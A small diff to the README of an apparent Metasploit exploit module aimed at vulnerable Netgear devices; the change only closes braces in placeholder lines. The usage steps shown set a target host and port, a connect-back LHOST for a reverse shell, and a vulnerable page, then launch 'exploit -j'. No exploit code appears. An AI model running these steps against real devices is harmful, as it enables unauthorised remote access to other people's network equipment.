@@ -6,8 +6,8 @@ Cheers, and happy hacking... <br />
 ## Usage 
 Copy the module into your metasploit directory, 
 
-SET RHOST = {Vulnerable Netgear Infrastructure <br />
-SET RPORT = {Port That vulnerable product is listening on  <br />
+SET RHOST = {Vulnerable Netgear Infrastructure} <br />
+SET RPORT = {Port That vulnerable product is listening on}  <br />
 SET LHOST = {The IP For Connect Back}<br />
 SET URI = {The Vulnerable Page}<br />
 exploit -j <br />
